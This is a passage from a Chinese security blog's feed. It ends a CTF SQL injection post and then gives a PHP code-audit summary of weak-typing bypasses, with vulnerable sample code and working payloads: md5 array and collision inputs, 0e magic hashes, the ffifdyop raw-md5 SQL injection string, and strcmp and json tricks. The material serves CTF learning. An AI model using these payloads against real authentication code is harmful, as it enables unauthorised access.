&lt; (table users limit 1);</code></pre><p>这里有个坑点，如果没有得到数据类型的话还是需要猜的，比如ID为1，前面就不能写成’1’<br>然后一直往下注入数据就行了</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h1><p><a href="https://www.cnblogs.com/phant0m/articles/16450646.html">https://www.cnblogs.com/phant0m/articles/16450646.html</a><br><a href="https://blog.csdn.net/weixin_49150931/article/details/111829828">https://blog.csdn.net/weixin_49150931/article/details/111829828</a><br><a href="https://blog.csdn.net/qq_53079406/article/details/125285625">https://blog.csdn.net/qq_53079406/article/details/125285625</a><br><a href="https://xz.aliyun.com/t/8646">https://xz.aliyun.com/t/8646</a><br><a href="https://blog.csdn.net/qq_38154820/article/details/121369208">https://blog.csdn.net/qq_38154820/article/details/121369208</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;关于这个漏洞，非常经典，但是考点又及其多，之前一直学的模模糊糊，遇到困难的地方就难以下手，故这里总结一下思路，参考</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="sql" scheme="https://sakurahack-y.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计总结</title>
    <link href="https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/</id>
    <published>2022-11-22T13:01:54.000Z</published>
    <updated>2022-11-22T13:22:14.259Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="php弱类型比较"><a href="#php弱类型比较" class="headerlink" title="php弱类型比较"></a>php弱类型比较</h2><h3 id="弱类型与强类型"><a href="#弱类型与强类型" class="headerlink" title="弱类型与强类型"></a>弱类型与强类型</h3><p>通常语言有强类型和弱类型两种，强类型指的是强制数据类型的语言，就是说，一个变量一旦被定义了某个类型，如果不经过强制类型转换，这个变量就一直是这个类型，在变量使用之前必须声明变量的类型和名称，且不经强制转换不允许两种不同类型的变量互相操作。我们称之为强类型，而弱类型可以随意转换变量的类型例如可以这样：</p><pre><code class="php">$text=1;$text=”string”</code></pre><p>也就是说php并不会验证变量的类型，可以随时的转换类型，估计开发者的意图是让程序员可以进行更高效的开发，所以在大量内置函数以及基本结构中使用了很多松散的比较和转换，防止程序中的变量因为程序员的不规范而报错，虽然提升了效率，但是引发了很多安全问题。<br>类型转换问题<br>类型转换最常见的就是int转String,String转int。<br><strong>Int转String:</strong><br>$num = 5;<br>方式1：item=(string)num;<br>方式2：item=strval(num);<br><strong>String转int:</strong><br>intval() 函数。(取整函数)<br>主要问题就出现在这个intval()函数上了。<br><strong>例子：</strong></p><pre><code class="php">var_dump(intval(4))//4var_dump(intval(‘1asd’))//1var_dump(intval(‘asd1’))//0</code></pre><p>上面三个例子说明了intval（）函数在转换字符串的时候即使碰到不能转换的字符串的时候它也不会报错，而是返回0。</p><pre><code class="php">&lt;?phpif($_GET[id]) &#123;    mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);    mysql_select_db(SAE_MYSQL_DB);    $id = intval($_GET[id]);    $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;));    if ($_GET[id]==1024) &#123;        echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;    &#125;    else&#123;         echo($query[content]);      &#125;&#125;?&gt;</code></pre><p>本题输入1024.1即可绕过</p><h3 id="与"><a href="#与" class="headerlink" title="==与==="></a>==与===</h3><p><strong>php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换。</strong><br> 在php中有两种比较符号: 一种是 ==，另外一种是 ===，都是用来比较两个数值是否相等的操作符，但他们也是有区别的:  </p><ol><li>== ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。</li><li>=== ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型</li></ol><p><strong>转换规则：</strong><br>1.若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。<br>若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串（例如”aaa”是不能转换为数字的字符串，而”123”或”123aa”就是可以转换为数字的字符串）或null，则转换为0；<br>例如:  </p><pre><code class="php"> var_dump(12==&quot;12&quot;)                                   // true var_dump(12==&quot;12aa&quot;)                              //true var_dump( &quot;admin&quot;==0)                                //true var_dump(false==&quot;&quot;==0==NULL)                        //true</code></pre><ol start="2"><li>布尔值true和任意字符串都弱相等。例如:  </li></ol><pre><code class="php">var_dump(true==&quot;hyuf&quot;)                   //true</code></pre><ol start="3"><li>数字和“e”开头加上数字的字符串（例如”1e123”）会当作科学计数法去比较；  (例外:-1.3e3转换为浮点数是-1300)</li><li>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0；  </li><li>当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,’E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字，则其值就是开始的数字，否则，其值为0。<br>例题:</li></ol><pre><code class="php">&lt;?phpshow_source(__FILE__);$a=@$_GET[&#39;a&#39;];$b=@$_GET[&#39;b&#39;];if ($a==0 and $a)&#123;    echo &quot;this is flag1&quot;;&#125;if(is_numeric($b))&#123;    exit();&#125;if ($b&gt;1234)&#123;    echo &quot;this is flag2&quot;;&#125;</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1663916772482-0a859568-2fd9-4c46-88e9-682985095366-16691231881951.png" alt="image.png"><br>a为0但是a又恒为true，我们直接传入一个字母即可  //根据转换规则一<br>b变量要得到flag必须不是一个数字，但是又要与数字比较，我们传入任意一个比1234大的数字，然后再加上字母即可绕过。  //根据转换规则一</p><h3 id="hash比较操作符问题"><a href="#hash比较操作符问题" class="headerlink" title="hash比较操作符问题"></a>hash比较操作符问题</h3><pre><code class="php"> &lt;?phpshow_source(__FILE__);$a = $_GET[&#39;a&#39;];$b = $_GET[&#39;b&#39;];if (md5($a) == md5($b)&amp;&amp;$a!=$b)&#123;    print(&quot;this is flag!&quot;);&#125;?&gt; </code></pre><h4 id="数组绕过-和-都适用"><a href="#数组绕过-和-都适用" class="headerlink" title="数组绕过(==和===都适用)"></a>数组绕过(==和===都适用)</h4><pre><code class="php">md5(string,raw)md5()进行比较时，可以两个里面输入数组，这样都是False,等于，可以绕过</code></pre><p>我们直接传入数组即可绕过</p><pre><code class="php">http://127.0.0.1/test.php?a[]=1&amp;b[]=2</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1663919320968-ea0a76f6-3f11-491e-9e2f-53475e0abca5.png" alt="image.png"></p><h4 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h4><pre><code class="php">&lt;?phpshow_source(__FILE__);$str1 = (string)$_GET[&#39;str1&#39;];$str2 = (string)$_GET[&#39;str2&#39;];if (!empty($str1)&amp;&amp;!empty($str2))&#123;    if ($str1!=$str2)&#123;        if (md5($str1) === md5($str2)) &#123;            print (&quot;this is flag&quot;);        &#125;       &#125;&#125;?&gt;</code></pre><p> 由于强制类型转换，传数组就不可行了，这里就需要MD5碰撞，对于需要两个内容不同但是MD5值相同的文件，使用Fastcoll就可以了<br>下载链接:<a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip</a><br>1.在目录下新建立一个文件如下<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664033361111-43dbc858-3a86-4e0e-ba38-6c58f5d42496.png" alt="image.png"><br>2.将这个文件拖到fastcoll_v1.0.0.5.exe上，等于使用fastcoll打开它。<br>3.fastcoll会自动生成两个文件：<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1663925372001-9f7671f0-2ff8-4b8d-9fd5-92f6acbdc23a.png" alt="image.png"><br> 这两个文件内容不同，但是md5值是相同的。<br>然后我们写一个php脚本根据生成的文件生成碰撞的字符串：  </p><pre><code class="php">&lt;?phpfunction readmyfile($path)&#123;    $fh = fopen($path, &quot;rb&quot;);    $data = fread($fh, filesize($path));    fclose($fh);    return $data;&#125;$a = urlencode(readmyfile(&quot;HY_msg1.txt&quot;));$b = urlencode(readmyfile(&quot;HY_msg2.txt&quot;));if(md5((string)urldecode($a))===md5((string)urldecode($b)))&#123;    echo &quot;a=&quot;;    echo $a;    echo &quot;\n&quot;;&#125;if(urldecode($a)!=urldecode($b))&#123;    echo &quot;b=&quot;;    echo $b;&#125;</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664033454749-29f51681-e0f7-46fd-a3b7-afbae9586942.png" alt="image.png"></p><pre><code class="php">a=LOVE%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00t%E4u%3F%FF7%E4%28%D6%EC%1A%C1%93%91%AF%D0j%02%BC%A7%05%98%DFE%29%06%3F%5D%116%C4%A0%06%C6%FC%C1N%89%3F%DAOZI%92%F3%F1%95inQw%B1%EA%C3%7D%B9%1D%89%7D%CB%09%3F%B1%CF%F5%F6%D1F%C0%D7%02%9F%BAS%C5%7D%13%FB%22%1733%84F%7F%D3%F4M%F4%B4%21%D8%CD%E7%CD%FE%FDv%3E%E3g2%F2%28%AA%8D%05%82%88%00%06%9E%D1%D0f%25w%C6%23%F2%CCT%C9%FC%AC%A9%D3%17b=LOVE%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00t%E4u%3F%FF7%E4%28%D6%EC%1A%C1%93%91%AF%D0j%02%BC%27%05%98%DFE%29%06%3F%5D%116%C4%A0%06%C6%FC%C1N%89%3F%DAOZI%92%F3q%96inQw%B1%EA%C3%7D%B9%1D%89%7DK%09%3F%B1%CF%F5%F6%D1F%C0%D7%02%9F%BAS%C5%7D%13%FB%22%1733%84%C6%7F%D3%F4M%F4%B4%21%D8%CD%E7%CD%FE%FDv%3E%E3g2%F2%28%AA%8D%05%82%88%80%05%9E%D1%D0f%25w%C6%23%F2%CCT%C9%7C%AC%A9%D3%17</code></pre><pre><code class="php">收录一些MD5值相等的字符串      $Param1=&quot;fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975%EA%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%DDa7%D0%40%C6i%97%10l%84%9D%BA%7FK%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhjj%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2AF%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0Cw%0E%A3%94%9B&quot;      $Param2=&quot;fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975j%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%5Db7%D0%40%C6i%97%10l%84%9D%BA%7F%CB%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhj%EA%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2%C1E%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0C%F7%0E%A3%94%9B&quot;          $Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;    $Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;    $data1=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;;    $data2=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;;</code></pre><p>传入我们生成的两个值</p><pre><code class="php">http://127.0.0.1/test.php?str1=LOVE%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00t%E4u%3F%FF7%E4%28%D6%EC%1A%C1%93%91%AF%D0j%02%BC%A7%05%98%DFE%29%06%3F%5D%116%C4%A0%06%C6%FC%C1N%89%3F%DAOZI%92%F3%F1%95inQw%B1%EA%C3%7D%B9%1D%89%7D%CB%09%3F%B1%CF%F5%F6%D1F%C0%D7%02%9F%BAS%C5%7D%13%FB%22%1733%84F%7F%D3%F4M%F4%B4%21%D8%CD%E7%CD%FE%FDv%3E%E3g2%F2%28%AA%8D%05%82%88%00%06%9E%D1%D0f%25w%C6%23%F2%CCT%C9%FC%AC%A9%D3%17&amp;str2=LOVE%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00t%E4u%3F%FF7%E4%28%D6%EC%1A%C1%93%91%AF%D0j%02%BC%27%05%98%DFE%29%06%3F%5D%116%C4%A0%06%C6%FC%C1N%89%3F%DAOZI%92%F3q%96inQw%B1%EA%C3%7D%B9%1D%89%7DK%09%3F%B1%CF%F5%F6%D1F%C0%D7%02%9F%BAS%C5%7D%13%FB%22%1733%84%C6%7F%D3%F4M%F4%B4%21%D8%CD%E7%CD%FE%FDv%3E%E3g2%F2%28%AA%8D%05%82%88%80%05%9E%D1%D0f%25w%C6%23%F2%CCT%C9%7C%AC%A9%D3%17</code></pre><p>成功获得flag<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664033627297-8e5b705a-634b-460a-9375-3634ea0257b1.png" alt="image.png"></p><h4 id="0e开头的字符串在参与比较时-会被当做科学计数法-结果转换为0-弱比较-才适用"><a href="#0e开头的字符串在参与比较时-会被当做科学计数法-结果转换为0-弱比较-才适用" class="headerlink" title="0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0(弱比较==才适用)"></a>0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0(弱比较==才适用)</h4><p> 比如将两个md5值进行弱类型比较</p><pre><code class="php">md5(&#39;QNKCDZO&#39;) == md5(240610708) MD5加密后会变成这个样子0e830400451993494058024219903391 == 0e462097431906509019562988736854</code></pre><p>由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样<br>0 == 0<br>返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等<br>常见md5为0e开头的字符串</p><pre><code class="php">s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020</code></pre><pre><code class="php">#授人以鱼不如授人以渔，下面使多线程MD5哈希碰撞脚本，威力巨大。是根据网上代码改编而成，非原创。#上面脚本注释部分是双MD5碰撞，取消注释然后注释掉24行stopxxx即可。#使用方法：python md5Crack.py &quot;你要碰撞的字符串&quot; 字符串的起始位置#例如：python md5Crack.py “0e&quot; 0#将产生MD5值为0e开头的字符串。#使用环境:python2#使用时请将上述注释全部删除# -*- coding: utf-8 -*-import multiprocessingimport hashlibimport randomimport stringimport sysCHARS = string.letters + string.digitsdef cmp_md5(substr, stop_event, str_len,start=0, size=20):    global CHARS    while not stop_event.is_set():        rnds = &#39;&#39;.join(random.choice(CHARS) for _ in range(size))        md5 = hashlib.md5(rnds)        value = md5.hexdigest()        if value[start: start+str_len] == substr:            print rnds            stop_event.set()            &#39;&#39;&#39;            #碰撞双md5            md5 = hashlib.md5(value)            if md5.hexdigest()[start: start+str_len] == substr:                print rnds+ &quot;=&gt;&quot; + value+&quot;=&gt;&quot;+ md5.hexdigest()  + &quot;\n&quot;                stop_event.set()            &#39;&#39;&#39; if __name__ == &#39;__main__&#39;:    substr = sys.argv[1].strip()    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0    str_len = len(substr)    cpus = multiprocessing.cpu_count()    stop_event = multiprocessing.Event()    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,                                         stop_event, str_len, start_pos))                 for i in range(cpus)]    for p in processes:        p.start()    for p in processes:        p.join()</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1663922788700-7d0c2c85-a2f9-4d71-af8e-ec0d941ba1e9.png" alt="image.png"></p><h4 id="绕过md5构造恒为真语句"><a href="#绕过md5构造恒为真语句" class="headerlink" title="绕过md5构造恒为真语句"></a>绕过md5构造恒为真语句</h4><pre><code class="php">select * from &#39;admin&#39; where password=md5($pass,true)</code></pre><p>pass输入</p><pre><code class="php">ffifdyop</code></pre><p> 这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是select * from ‘admin’ where password=’’ or ‘6xxxxx’。等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数  </p><h4 id="特殊的md5值"><a href="#特殊的md5值" class="headerlink" title="特殊的md5值"></a>特殊的md5值</h4><p>双md5结果仍为0e开头字符串大全</p><pre><code class="php">      0e215962017                0e291242476940776845150308577824         CbDLytmyGm2xQyaLNhWn         md5(CbDLytmyGm2xQyaLNhWn) =&gt; 0ec20b7c66cafbcc7d8e8481f0653d18         md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; 0e3a5f2a80db371d4610b8f940d296af         770hQgrBOjrcqftrlaZk         md5(770hQgrBOjrcqftrlaZk) =&gt; 0e689b4f703bdc753be7e27b45cb3625         md5(md5(770hQgrBOjrcqftrlaZk)) =&gt; 0e2756da68ef740fd8f5a5c26cc45064         7r4lGXCH2Ksu2JNT3BYM         md5(7r4lGXCH2Ksu2JNT3BYM) =&gt; 0e269ab12da27d79a6626d91f34ae849         md5(md5(7r4lGXCH2Ksu2JNT3BYM)) =&gt; 0e48d320b2a97ab295f5c4694759889f</code></pre><h3 id="十六进制转换问题"><a href="#十六进制转换问题" class="headerlink" title="十六进制转换问题"></a>十六进制转换问题</h3><p>我们来看一个例子:</p><pre><code class="php">&lt;?phpif (&quot;0x1e240&quot;==&quot;123456&quot;)&#123;    print &quot;1\n&quot;;    if (&quot;0x1e240&quot;==123456)&#123;        print &quot;2\n&quot;;        if (&quot;0x1e240&quot;==&quot;1e240&quot;)&#123;            print &quot;3&quot;;        &#125;    &#125;&#125;</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664034227137-6faf04cb-61b1-4d5e-9440-6dae4bb92b20.png" alt="image.png"><br>php在接受一个带0x的字符串的时候，会自动把这行字符串解析成十进制的再进行比较，0x1e240解析成十进制就是123456，并且与字符串类型的123456和int型的123456都相同。<br>ctf题目:</p><pre><code class="php">&lt;?php    function noother_says_correct($number)&#123;        $one = ord(&#39;1&#39;);        $nine = ord(&#39;9&#39;);        for ($i = 0; $i &lt; strlen($number); $i++) &#123;            $digit = ord($number&#123;$i&#125;);            if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123;                return false;            &#125;        &#125;        return $number == &#39;54975581388&#39;;    &#125;    $flag=&#39;flag&#123;This_Is_f1ag&#125;&#39;;    if(noother_says_correct($_GET[&#39;key&#39;]))        echo $flag;    else        echo &#39;access denied&#39;;</code></pre><p>题目的大概意思就是说，我们要传入一个字符串，里面没有数字，但是要和54975581388相等，而54975581388这个数的16进制很巧妙，没有任何数字</p><pre><code class="php">print base_convert(&quot;54975581388&quot;,10,16);  //ccccccccc</code></pre><p>那我们就可以用16进制来绕过<br>payload:</p><pre><code class="php">http://127.0.0.1/test.php?key=0xccccccccc</code></pre><h3 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h3><p> JSON概念很简单，JSON 是一种轻量级的数据格式，他基于 javascript 语法的子集，即数组和对象表示。由于使用的是 javascript 语法，因此JSON 定义可以包含在javascript 文件中，对其的访问无需通过基于 XML 的语言来额外解析。<br>示例:</p><pre><code class="php">&lt;?phpif (isset($_POST[&#39;message&#39;])) &#123;    $message = json_decode($_POST[&#39;message&#39;]);    $key =&quot;*********&quot;;    if ($message-&gt;key == $key) &#123;        echo &quot;flag&quot;;    &#125;    else &#123;        echo &quot;fail&quot;;    &#125;&#125;else&#123;     echo &quot;~~~~&quot;;&#125;?&gt;</code></pre><p>输 入一个数组进行json解码，如果解码后的message与key值相同，会得到flag，主要思想还是弱类型进行绕过，我们不知道key值是什莫，但是我们知道一件事就是它肯定是字符串(当然，这里的前提条件是key中没有数字)，这样就可以了，上文讲过，两个等号时会转化成同一类型再进行比较，直接构造一个0就可以相等了。最终payload message={“key”:0}。<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664112502794-d8342c7e-bf22-4eee-9c3b-96463cb2bf28.png" alt="image.png"></p><h2 id="php内置函数的松散性"><a href="#php内置函数的松散性" class="headerlink" title="php内置函数的松散性"></a>php内置函数的松散性</h2><p> 主要意思就是php内部函数在调用时给函数传递函数无法接受的参数类型但是却没有报错的情况  </p><h3 id="MD5-，sha1绕过"><a href="#MD5-，sha1绕过" class="headerlink" title="MD5 ，sha1绕过"></a>MD5 ，sha1绕过</h3><p>这两个都是加密函数，分别给字符串进行MD5加密和计算字符串的 SHA-1 散列。<br>但是这个函数都有着缺陷，就是不能处理数组，这样就很容易被绕过了</p><pre><code class="php">&lt;?phpif (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) &#123;    if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;])        if (md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))            die(&quot;flag&#123;This_Is_F1ag&#125;&quot;);    else        print &#39;Wrong.&#39;;&#125;?&gt;</code></pre><p>直接构造数组就可以绕过了payload: a[]=1&amp;b[]=2<br>也就是上文的hash比较中的数组绕过，为了方便总结hash的知识点，就把那里的绕过方法都写了上去</p><h3 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h3><p>缺陷原理相同，绕过姿势相同，如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。如下：</p><pre><code class="php">&lt;?php$i =&quot;3name&quot;;switch ($i) &#123;    case 0:case 1:case 2:        echo &quot;this is two&quot;;        break;        case 3:            echo &quot;flag&#123;This_is_f1ag&#125;&quot;;            break;&#125;?&gt;</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664113177992-39954b95-885f-4b97-a02a-e5d6f30c7eb8.png" alt="image.png"></p><h3 id="strcmp绕过-这个时候程序输出的是，类型转换的i，结果为3返回flag"><a href="#strcmp绕过-这个时候程序输出的是，类型转换的i，结果为3返回flag" class="headerlink" title="strcmp绕过(这个时候程序输出的是，类型转换的i，结果为3返回flag )"></a>strcmp绕过(这个时候程序输出的是，类型转换的i，结果为3返回flag )</h3><p>strcmp()函数在PHP官方手册中的描述是int strcmp ( string str1,stringstr2 ),需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值</p><pre><code class="php">&lt;?php$password=&quot;***************&quot;;if(isset($_POST[&#39;password&#39;]))&#123;if (strcmp($_POST[&#39;password&#39;], $password) == 0) &#123;        echo &quot;Right!!!login success&quot;;        exit();     &#125; else &#123;     echo &quot;Wrong password..&quot;;      &#125;?&gt;</code></pre><p>在这个题目中我们需要自己输入一个password的值和$password相比较但是我们不知道这个password的值，有可能时字符串有可能时数字，这个时候怎末办呢，依然时相同的绕过姿势，试一试数组绕过假设如果传入一个数组会怎末样呢？我们传入password[]=xxx ，绕过成功。<br>原理是因为函数接受到了不符合的类型，将发生错误，函数返回值为0，所以判断相等。<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664115029345-c4396917-332e-43ca-8625-e84c1f5fe398.png" alt="image.png"></p><h3 id="array-search（）、in-array-绕过"><a href="#array-search（）、in-array-绕过" class="headerlink" title="array_search（）、in_array()绕过"></a>array_search（）、in_array()绕过</h3><pre><code class="php">mixed array_search ( mixed $needle , array $haystack [, bool $strict = false ] ) </code></pre><p> array_search() 函数在数组中搜索某个键值，并返回对应的键名。<br>in_array() 函数搜索数组中是否存在指定的值。<br>基本功能是相同的，也就是说绕过姿势也相同。Array系列有两种安全问题，一种是正常的数组绕过，一种是<br>“= =”号问题。先讲第一个数组绕过。<br>如果两个函数的第三个参数为true那么下列方法就无效了<br> needle，haystack必需，strict可选 函数判断haystack中的值是存在needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤  </p><h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><pre><code class="php">&lt;?phpif(!is_array($_GET[&#39;test&#39;]))&#123;    exit();&#125;$test=$_GET[&#39;test&#39;];for($i=0;$i&lt;count($test);$i++)&#123;    if($test[$i]===&quot;admin&quot;)&#123;        echo 